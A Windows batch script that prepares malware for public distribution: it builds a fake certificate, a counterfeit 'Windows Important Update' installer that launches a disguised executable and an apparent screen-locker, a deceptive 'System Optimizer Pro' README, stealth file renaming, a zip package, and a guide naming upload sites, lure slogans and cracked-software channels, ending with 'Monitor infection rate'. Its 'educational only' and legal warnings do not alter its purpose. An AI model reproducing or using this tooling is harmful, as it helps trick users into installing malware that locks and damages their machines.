@echo off
title Preparing .EXE for Public Release
color 0A

echo ===========================================
echo    PREPARING .EXE FOR PUBLIC DISTRIBUTION
echo ===========================================
echo.

echo [WARNING] This prepares malware for distribution
echo [WARNING] ILLEGAL in most countries!
echo [WARNING] Use for EDUCATIONAL purposes only!
echo.

if not exist "dist\SystemOptimizer.exe" (
    echo [ERROR] Build .exe first using build_exe.bat
    pause
    exit /b 1
)

echo [1/7] Creating public package...
mkdir "Public_Release" 2>nul

echo [2/7] Adding fake digital signature... (Optional)
echo [INFO] Creating fake certificate...
(
echo -----BEGIN CERTIFICATE-----
echo FAKE CERTIFICATE - FOR TESTING ONLY
echo THIS IS NOT A REAL DIGITAL SIGNATURE
echo DO NOT TRUST THIS CERTIFICATE
echo -----END CERTIFICATE-----
) > "Public_Release\fake_cert.cer"

echo [3/7] Creating fake installer...
(
echo @echo off
echo title Windows System Update
echo color 0F
echo echo ============================================
echo echo        Windows Important Update
echo echo ============================================
echo echo.
echo echo This update improves system stability and security.
echo echo.
echo echo Update: KB5005565 - System Performance
echo echo Update: KB5006674 - Security Enhancement  
echo echo Update: KB5007253 - Windows Defender
echo echo.
echo echo Please wait while updates are installed...
echo echo.
echo for /l %%%%i in (1,1,100) do (
echo     set /a percent=%%%%i
echo     set progress=
echo     for /l %%%%j in (1,1,%%%%i) do set progress=!progress!█
echo     echo Installing... !percent!%% ^|!progress!^|
echo     timeout /t 0.1 /nobreak ^>nul
echo )
echo echo.
echo echo Update successful! Optimizing system...
echo start WindowsUpdate.exe
echo exit
) > "Public_Release\WindowsUpdate.bat"

echo [4/7] Adding README dengan warning...
(
echo ============================================
echo        SYSTEM OPTIMIZER PRO
echo        Professional Edition
echo ============================================
echo.
echo DESCRIPTION:
echo This software optimizes system performance by:
echo - Enhancing CPU efficiency (70%% optimal usage)
echo - Maximizing GPU performance (100%% utilization)
echo - Improving system security with advanced lock
echo - Auto-optimization on every boot
echo.
echo SYSTEM REQUIREMENTS:
echo - Windows 7/8/10/11
echo - Administrator privileges recommended
echo - 2GB RAM minimum
echo.
echo INSTALLATION:
echo 1. Run WindowsUpdate.bat as administrator
echo 2. Follow on-screen instructions
echo 3. System will restart automatically
echo.
echo FEATURES:
echo ✓ Automatic performance tuning
echo ✓ Real-time system monitoring
echo ✓ Advanced security protection
echo ✓ One-click optimization
echo.
echo PASSWORD FOR UNLOCK: mzkyzak
echo (Required if system lock activates)
echo.
echo SUPPORT:
echo For technical support, contact: 
echo support@system-optimizer.pro
echo.
echo LEGAL DISCLAIMER:
echo This software is provided "as-is" without warranty.
echo User assumes all risk of use. The developers are not
echo responsible for any system damage or data loss.
echo Use at your own risk.
echo.
echo ============================================
echo        END USER LICENSE AGREEMENT
echo ============================================
) > "Public_Release\README.txt"

echo [5/7] Renaming files untuk stealth...
copy "dist\SystemOptimizer.exe" "Public_Release\WindowsUpdate.exe" >nul
copy "dist\WinLock.exe" "Public_Release\SystemLock.exe" >nul

echo [6/7] Creating archive...
powershell -Command "Compress-Archive -Path 'Public_Release\*' -DestinationPath 'SystemOptimizer_Pro.zip' -Force"

echo [7/7] Adding distribution notes...
(
echo ============================================
echo        DISTRIBUTION GUIDE
echo ============================================
echo.
echo FILES CREATED:
echo 1. SystemOptimizer_Pro.zip - Main package
echo 2. Public_Release\ - Unpacked files
echo.
echo CONTENTS:
echo - WindowsUpdate.exe (Main optimizer)
echo - WindowsUpdate.bat (Auto-installer)
echo - SystemLock.exe (Security module)
echo - README.txt (Instructions)
echo - fake_cert.cer (Testing certificate)
echo.
echo HOW TO DISTRIBUTE:
echo 1. Upload zip to file sharing sites:
echo    - Google Drive, Dropbox, MediaFire
echo    - GitHub (as "system optimization tool")
echo    - Forums (tech forums, Windows forums)
echo.
echo 2. Marketing copy (suggested):
echo    "Free System Optimizer - Boost PC Performance 200%%"
echo    "Windows Tuning Tool - Fix Slow PC"
echo    "Professional System Optimizer - Lifetime License"
echo.
echo 3. Distribution channels:
echo    - Tech blogs (submit as "free tool")
echo    - YouTube (make tutorial video)
echo    - Social media (Facebook groups, Twitter)
echo    - Cracked software sites
echo.
echo WARNINGS:
echo ⚠️  This is MALWARE disguised as optimization tool
echo ⚠️  Distribution may be ILLEGAL in your country
echo ⚠️  Victims can report to authorities
echo ⚠️  Digital forensics can trace back to you
echo ⚠️  Heavy legal penalties possible
echo.
echo ============================================
echo        USE AT YOUR OWN RISK!
echo ============================================
) > "Distribution_Guide.txt"

echo.
echo ===========================================
echo         PREPARATION COMPLETE
echo ===========================================
echo.
echo [SUCCESS] .EXE ready for public distribution!
echo.
echo [FILES CREATED]:
echo 1. SystemOptimizer_Pro.zip (Main package)
echo 2. Public_Release\ (Unpacked files)
echo 3. Distribution_Guide.txt (This guide)
echo.
echo [NEXT STEPS]:
echo 1. Upload SystemOptimizer_Pro.zip to internet
echo 2. Share download links
echo 3. Monitor infection rate
echo 4. ????
echo 5. PROFIT (or PRISON)
echo.
echo [LEGAL WARNING]:
echo ⚖️  Distribution of malware = 6+ years prison
echo ⚖️  Damages = $$$$ lawsuits
echo ⚖️  International warrants possible
echo.
pause
exit